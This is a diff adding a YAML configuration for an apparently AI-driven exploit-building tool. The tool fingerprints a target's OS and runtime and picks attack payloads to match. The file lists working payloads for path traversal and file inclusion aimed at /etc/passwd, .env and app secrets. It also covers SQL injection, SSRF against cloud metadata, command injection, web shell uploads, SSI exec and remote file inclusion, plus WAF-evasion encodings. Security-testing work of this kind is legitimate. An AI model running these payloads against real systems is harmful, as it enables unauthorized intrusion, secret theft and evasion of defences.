@@ -1,0 +1,523 @@
+# Which payload to send, and what proves it, for THIS target.
+#
+# The class says WHAT the vulnerability is; this says what to actually send at
+# it. Those are different questions and they belong in different files: a path
+# traversal is a path traversal on every host, but `/etc/passwd` is useless
+# against IIS and `win.ini` is useless against nginx.
+#
+# Why it exists: `assets.os` has existed for a long time and is populated on
+# 0 of 2,295 rows; nothing in the build-PoC pipeline referenced an OS at all.
+# The craft guidance compensated by HEDGING — the lfi and path-traversal
+# entries list `/etc/passwd` and `win.ini` side by side and let the model
+# guess. A wrong guess costs a refine iteration that the loop then reads as
+# "the endpoint is wrong" rather than "the OS is wrong".
+#
+# TWO AXES, not one. The operator asked about OS, and OS is only half of it:
+#   os      linux | windows      decides path separators and system files
+#   runtime php | java | dotnet  decides wrappers and app files, independent
+#                                of OS — `php://filter` works on PHP on
+#                                Windows, `web.xml` is Java anywhere.
+# An entry may declare either, both, or neither (neither = always applicable).
+#
+# THREE OUTCOMES. An unknown OS does NOT mean "assume linux". It means every
+# variant applies and the caller is told the selection was ambiguous, so the
+# build tries both and records which one worked — paying the ambiguity once
+# per build instead of once per iteration.
+
+version: 1
+
+os_families: [linux, windows]
+runtimes: [php, java, dotnet, node, python, ruby]
+
+# ── detection ───────────────────────────────────────────────────────────────
+#
+# Ordered: the first rule that matches wins, so put the unambiguous signals
+# first. `provenance` feeds the existing confidence scale — a banner is
+# `scan_observed`, a guess from a file extension is weaker.
+detection:
+
+  - id: iis_server_header
+    where: header
+    header: server
+    pattern: '(?i)\bIIS\b|Microsoft-HTTPAPI|Microsoft-IIS'
+    os: windows
+    provenance: scan_observed
+
+  - id: aspnet_powered_by
+    where: header
+    header: x-powered-by
+    pattern: '(?i)asp\.net'
+    os: windows
+    runtime: dotnet
+    provenance: scan_observed
+
+  - id: aspnet_version_header
+    where: header
+    header: x-aspnet-version
+    pattern: '.'
+    os: windows
+    runtime: dotnet
+    provenance: scan_observed
+
+  - id: windows_path_in_output
+    where: body
+    pattern: '[A-Za-z]:\\(?:inetpub|Windows|Program Files|Users)\\'
+    os: windows
+    provenance: scan_observed
+
+  - id: nix_server_header
+    where: header
+    header: server
+    pattern: '(?i)ubuntu|debian|centos|red ?hat|fedora|alpine|\bunix\b|\(unix\)'
+    os: linux
+    provenance: scan_observed
+
+  - id: nix_path_in_output
+    where: body
+    pattern: '/(?:var/www|usr/share|usr/local|home/[a-z]+|opt)/'
+    os: linux
+    provenance: scan_observed
+
+  - id: php_powered_by
+    where: header
+    header: x-powered-by
+    pattern: '(?i)php/'
+    runtime: php
+    provenance: scan_observed
+
+  - id: java_session_cookie
+    where: header
+    header: set-cookie
+    pattern: 'JSESSIONID'
+    runtime: java
+    provenance: scan_observed
+
+  - id: aspx_extension_seen
+    where: path
+    pattern: '\.(?:aspx?|ashx|asmx)(?:$|\?)'
+    os: windows
+    runtime: dotnet
+    provenance: scan_observed
+
+  - id: php_extension_seen
+    where: path
+    pattern: '\.php[345]?(?:$|\?)'
+    runtime: php
+    provenance: scan_observed
+
+  - id: jsp_extension_seen
+    where: path
+    pattern: '\.(?:jsp|do|action)(?:$|\?)'
+    runtime: java
+    provenance: scan_observed
+
+  - id: python_wsgi_server_header
+    where: header
+    header: server
+    pattern: '(?i)gunicorn|werkzeug|uvicorn|waitress|cherrypy|tornado'
+    runtime: python
+    provenance: scan_observed
+
+  - id: python_version_in_server_header
+    where: header
+    header: server
+    pattern: '(?i)python/\d'
+    runtime: python
+    provenance: scan_observed
+
+  - id: django_csrf_cookie
+    where: header
+    header: set-cookie
+    pattern: 'csrftoken='
+    runtime: python
+    provenance: scan_observed
+
+  - id: express_powered_by
+    where: header
+    header: x-powered-by
+    pattern: '(?i)express'
+    runtime: node
+    provenance: scan_observed
+
+  - id: node_session_cookie
+    where: header
+    header: set-cookie
+    pattern: 'connect\.sid='
+    runtime: node
+    provenance: scan_observed
+
+  - id: rails_runtime_header
+    where: header
+    header: x-runtime
+    pattern: '^[0-9.]+$'
+    runtime: ruby
+    provenance: scan_observed
+
+  - id: ruby_server_header
+    where: header
+    header: server
+    pattern: '(?i)puma|unicorn|webrick|passenger'
+    runtime: ruby
+    provenance: scan_observed
+
+  - id: python_extension_seen
+    where: path
+    pattern: '\.(?:py|wsgi)(?:$|\?)'
+    runtime: python
+    provenance: scan_observed
+
+  # ── OUTPUT ANALYSIS ────────────────────────────────────────────────────
+  #
+  # When no header, cookie or extension says anything, READ WHAT CAME BACK.
+  # A stack trace names the runtime far more reliably than a Server header a
+  # proxy can rewrite, and an error page is exactly what a half-working
+  # exploit produces. These sit last so an explicit header always wins.
+
+  - id: python_traceback_in_output
+    where: body
+    pattern: 'Traceback \(most recent call last\)|/usr/lib/python3|werkzeug\.exceptions|django\.core'
+    runtime: python
+    os: linux
+    provenance: scan_observed
+
+  - id: node_stack_in_output
+    where: body
+    pattern: 'at Object\.<anonymous>|node_modules[/\\]|Error: Cannot find module'
+    runtime: node
+    provenance: scan_observed
+
+  - id: java_stack_in_output
+    where: body
+    pattern: '\bat (?:org|com|java|javax)\.[a-z0-9_.]+\(|\.java:\d+\)|java\.lang\.[A-Z]'
+    runtime: java
+    provenance: scan_observed
+
+  - id: php_error_in_output
+    where: body
+    pattern: '(?i)(?:fatal error|parse error|warning):.*?(?:on line \d+|\.php)|call to undefined function'
+    runtime: php
+    provenance: scan_observed
+
+  - id: dotnet_stack_in_output
+    where: body
+    pattern: 'System\.(?:Web|IO|NullReferenceException)|Microsoft\.AspNetCore|\[HttpException'
+    runtime: dotnet
+    os: windows
+    provenance: scan_observed
+
+  - id: ruby_stack_in_output
+    where: body
+    pattern: '(?:\.rb:\d+:in |ActionController::|ActiveRecord::)'
+    runtime: ruby
+    provenance: scan_observed
+
+# ── variants ────────────────────────────────────────────────────────────────
+#
+# `proof` maps the thing requested to a regex that ONLY the real content
+# matches. These were `_FILE_READ_SIGNATURES` in api.py — the same table,
+# flattened and OS-blind, so a Windows target was offered /etc/passwd.
+variants:
+
+  path-traversal:
+    - os: linux
+      payloads:
+        - '../../../../etc/passwd'
+        - '..%2f..%2f..%2f..%2fetc%2fpasswd'
+        - '....//....//....//etc/passwd'
+        - '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+        - '../../../../proc/self/environ'
+      proof:
+        '/etc/passwd': 'root:x:0:0:'
+        '/etc/hosts': '127\.0\.0\.1'
+        '/proc/self/environ': 'PATH='
+        # Recognised but deliberately NOT in `payloads` -- see proof_caveats.
+        '/etc/shadow': 'root:[\$\*!]'
+      # ACCESS PERMISSIONS, declared rather than assumed. An empty read means
+      # two different things and the loop cannot tell them apart on its own:
+      # the traversal failed, or the traversal worked and the file was not
+      # readable. Under the repeated-outcome rule an empty result twice sets a
+      # REQUIRED AXIS and walks the build away from a primitive that WAS
+      # working -- a refutation manufactured out of a file permission.
+      #   world      always readable; safe to use as THE proof target
+      #   privileged needs root; an empty read proves nothing
+      #   process    readable only from the app's own process
+      proof_access:
+        '/etc/passwd':
+          readable: world
+          note: 'Mode 0644 on every linux host. This is the proof target.'
+        '/etc/hosts':
+          readable: world
+          note: 'Mode 0644. Good second choice, and less sensitive.'
+        '/etc/shadow':
+          readable: privileged
+          note: >-
+            Mode 0640 root:shadow -- the web-server user CANNOT read it. An
+            empty or denied read is a PERMISSIONS outcome, NOT a refutation of
+            the traversal. Never use it as the proof target.
+        '/proc/self/environ':
+          readable: process
+          note: >-
+            Readable only when the read happens inside the app's own process
+            (the usual LFI case). Through a static-file handler it is often
+            absent, so a miss says nothing about the traversal.
+      note: >-
+        `/etc/passwd` is world-readable (0644) and present on every Linux host,
+        which is why it is the first payload and the proof target. Depth
+        matters: too few `../` lands above the web root and returns the app's
+        own 404, which is not a refutation of the traversal either.
+    - os: windows
+      payloads:
+        - '..\..\..\..\windows\win.ini'
+        - '..%5c..%5c..%5cwindows%5cwin.ini'
+        - '../../../../windows/win.ini'
+        - '..%252f..%252f..%252fwindows%252fwin.ini'
+      proof:
+        'win.ini': '\[fonts\]'
+        'windows\\system32\\drivers\\etc\\hosts': '127\.0\.0\.1'
+      note: >-
+        IIS normalises `/` to `\`, so the forward-slash form often works where
+        the backslash form is filtered. Try both before concluding.
+    - runtime: java
+      payloads:
+        - '../../../../WEB-INF/web.xml'
+        - '..%2f..%2f..%2fWEB-INF%2fweb.xml'
+      proof:
+        'WEB-INF/web.xml': '<web-app'
+      note: Java app, any OS — the descriptor is where the servlet mappings are.
+    - runtime: dotnet
+      payloads:
+        - '../../../../web.config'
+      proof:
+        'web.config': '<configuration'
+    - runtime: python
+      payloads:
+        - '../../../../app/settings.py'
+        - '../../../../settings.py'
+        - '../../../../manage.py'
+        - '../../../../app.py'
+        - '../../../../.env'
+      proof:
+        'settings.py': 'SECRET_KEY|INSTALLED_APPS|DATABASES'
+        'manage.py': 'DJANGO_SETTINGS_MODULE|execute_from_command_line'
+        'app.py': '(?m)^(?:from|import)\\s+\\w+'
+        '.env': '(?m)^[A-Z][A-Z0-9_]*='
+      proof_access:
+        'settings.py':
+          readable: world
+          note: 'App-owned source; readable whenever the traversal reaches it.'
+      note: >-
+        Python has no `php://filter` equivalent -- there is no wrapper that
+        returns source, so read the file directly. `/proc/self/environ` is the
+        better secret source when the read happens in-process.
+    - runtime: node
+      payloads:
+        - '../../../../package.json'
+        - '../../../../server.js'
+        - '../../../../app.js'
+        - '../../../../.env'
+      proof:
+        'package.json': '\"(?:dependencies|name|version)\"\\s*:'
+        'server.js': '(?m)^(?:const|let|var|require|import)\\b'
+      note: >-
+        `package.json` is the reliable one: it is always at the app root and
+        its shape cannot be echoed back by accident.
+    - runtime: ruby
+      payloads:
+        - '../../../../config/database.yml'
+        - '../../../../Gemfile'
+        - '../../../../config/secrets.yml'
+      proof:
+        'database.yml': '(?m)^\\s*adapter:'
+        'Gemfile': "(?m)^\\s*(?:source|gem)\\s"
+
+  lfi:
+    - os: linux
+      payloads:
+        - '../../../../etc/passwd'
+        - '/etc/passwd'
+        - '../../../../proc/self/environ'
+      proof:
+        '/etc/passwd': 'root:x:0:0:'
+        '/proc/self/environ': 'PATH='
+    - os: windows
+      payloads:
+        - '..\..\..\..\windows\win.ini'
+        - 'C:\windows\win.ini'
+      proof:
+        'win.ini': '\[fonts\]'
+    - runtime: php
+      payloads:
+        - 'php://filter/convert.base64-encode/resource=index.php'
+        - 'php://filter/read=string.rot13/resource=index.php'
+      proof:
+        'php://filter': '^[A-Za-z0-9+/=\s]{200,}$'
+      note: >-
+        The wrapper returns base64 of the SOURCE, so the proof is a long
+        base64 blob, not file content. Works on PHP regardless of OS.
+    - runtime: java
+      payloads:
+        - '../../../../WEB-INF/web.xml'
+      proof:
+        'WEB-INF/web.xml': '<web-app'
+
+  # Added 2026-10-17. The refine loop now offers an ordered payload menu, and
+  # the three biggest classes in a focused-12 round (auth-bypass 68, sqli 54,
+  # ssrf 27) had NO entries — the menu was empty for every build that needed
+  # it. Ordered by what proves the bug soonest, not by exoticism.
+  sqli:
+      # No os/runtime axis: SQL injection is a property of the query layer,
+      # not of the host. Omitted rather than written as "any", which is not a
+      # declared axis value — the vocabulary is closed on purpose.
+    - payloads:
+        # Reflected first: a visible marker proves execution, where a timing
+        # verdict only proves the server was slow (CLAUDE.md requires the
+        # scaled-payload confirmation before a latency verdict counts).
+        - "' UNION SELECT 1,'<CANARY>',3-- "
+        - "' OR '1'='1"
+        - "1' AND 1=CONVERT(int,(SELECT '<CANARY>'))-- "
+        - "' AND (SELECT SLEEP(5))-- "
+        - "'; WAITFOR DELAY '0:0:5'-- "
+        - "' AND 1=(SELECT 1 FROM pg_sleep(5))-- "
+        - "1 AND (SELECT BENCHMARK(5000000,MD5('a')))"
+      proof:
+        "UNION SELECT": "<CANARY>"
+        "CONVERT(int": "(?i)conversion failed|invalid input syntax"
+      note: >-
+        Prefer a REFLECTED canary: it proves the payload executed. Fall back to
+        timing only when nothing is reflected, and expect the scaled re-run
+        (SLEEP(N) -> SLEEP(N+7)) to confirm it before the verdict counts.
+
+  ssrf:
+      # No os/runtime axis — the fetch happens server-side regardless.
+    - payloads:
+        # SSRF proves OUT OF BAND: the response body usually says nothing,
+        # so the sink receiving the request is the evidence.
+        - "http://<SINK>/<CANARY>"
+        - "http://127.0.0.1:80/"
+        - "http://localhost/"
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://[::1]/"
+        - "http://2130706433/"
+        - "file:///etc/passwd"
+        - "gopher://<SINK>:80/_GET%20/"
+      proof:
+        "169.254.169.254": "(?i)ami-id|instance-id|iam/"
+        "file:///etc/passwd": "root:x:0:0:"
+      note: >-
+        The decimal (2130706433) and IPv6 ([::1]) forms exist to pass a filter
+        that blocks the literal 127.0.0.1. With no reachable sink the class
+        cannot be proven out of band — say so rather than asserting on an echo.
+
+  cmdi:
+    - os: linux
+      payloads: [';id', '|id', '$(id)', '`id`', '%0aid', ';uname -a']
+      proof:
+        'id': 'uid=\d+\([^)]+\)'
+        'uname -a': '(?i)linux'
+      note: >-
+        `id` is the strongest proof on linux: the output shape cannot be
+        echoed back by accident.
+    - os: windows
+      payloads: ['& whoami', '| whoami', '&& whoami', '%0a whoami', '& ver']
+      proof:
+        'whoami': '(?i)[a-z0-9_.-]+\\[a-z0-9_.-]+'
+        'ver': '(?i)microsoft windows \[version'
+      note: >-
+        `whoami` prints DOMAIN\user, which is why the proof regex is a
+        backslash pair rather than a word — a bare username could be echoed.
+
+  rce:
+    - os: linux
+      payloads: ['id', 'uname -a', 'hostname']
+      proof:
+        'id': 'uid=\d+\([^)]+\)'
+    - os: windows
+      payloads: ['whoami', 'ver', 'hostname']
+      proof:
+        'whoami': '(?i)[a-z0-9_.-]+\\[a-z0-9_.-]+'
+
+  upload:
+    - runtime: php
+      payloads: ['shell.php', 'shell.phtml', 'shell.php5', 'shell.php.jpg']
+      proof: {'uploaded file': '(?i)uid=\d+|<\?php'}
+    - runtime: java
+      payloads: ['shell.jsp', 'shell.jspx']
+      proof: {'uploaded file': '(?i)uid=\d+'}
+    - runtime: dotnet
+      payloads: ['shell.aspx', 'shell.asmx', 'web.config']
+      proof: {'uploaded file': '(?i)[a-z0-9_.-]+\\[a-z0-9_.-]+'}
+
+  ssi-injection:
+    - os: linux
+      payloads: ['<!--#exec cmd="id"-->', '<!--#echo var="DOCUMENT_ROOT"-->']
+      proof: {'exec cmd=id': 'uid=\d+\([^)]+\)'}
+    - os: windows
+      payloads: ['<!--#exec cmd="whoami"-->']
+      proof: {'exec cmd=whoami': '(?i)[a-z0-9_.-]+\\[a-z0-9_.-]+'}
+
+  rfi:
+    - runtime: php
+      payloads: ['http://{sink}/x.txt', 'http://{sink}/x.txt%00']
+      proof: {'sink request': 'x\.txt'}
+      note: >-
+        allow_url_include must be on; a response with no sink hit is a clean
+        negative rather than a crafting error.
+
+# WAF SHAPE FAMILIES — what _characterize_waf sends as ?x=<value> to learn
+# which payload SHAPES a WAF blocks before any exploit is attempted. Moved out
+# of app/rag-api/api.py (a function-local dict literal) on 2026-10-17.
+# `family` is the display label the characterisation report has always used,
+# kept verbatim so prompts that quote it read the same; `vuln_class` is the
+# canonical name from vuln_classes.yaml. Values are URL-safe as written.
+waf_shapes:
+- family: RCE
+  vuln_class: rce
+  variants:
+  - - plain
+    - ;id
+  - - case-swap
+    - ;iD
+  - - $IFS bypass
+    - ;id${IFS}-a
+  - - backtick
+    - ;`id`
+  - - brace expand
+    - ;{id,-a}
+  - - hex escape
+    - ;$'\x69\x64'
+  - - encoded ;
+    - '%3Bid'
+- family: SQLi
+  vuln_class: sqli
+  variants:
+  - - plain
+    - ''' OR ''1''=''1--'
+  - - case-swap
+    - ''' Or ''1''=''1--'
+  - - inline /**/
+    - ''' /*!OR*/ ''1''=''1--'
+  - - nested comment
+    - ''' /*!50000OR*/ ''1''=''1--'
+  - - url-encoded quote
+    - '%2527 OR %25271%2527=%25271--'
+  - - no-space UNION
+    - '''UNION/**/SELECT/**/1--'
+  - - backtick col
+    - ''' OR `1`=`1--'
+- family: LFI
+  vuln_class: lfi
+  variants:
+  - - plain
+    - ../../../etc/passwd
+  - - double-encode
+    - '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+  - - unicode
+    - ..%c0%af..%c0%afetc%c0%afpasswd
+  - - null byte
+    - ../../../etc/passwd%00
+  - - backslash
+    - ..\..\..\etc\passwd
+  - - php wrapper
+    - php://filter/convert.base64-encode/resource=/etc/passwd
+  - - nested traversal
+    - '....//....//....//etc/passwd'
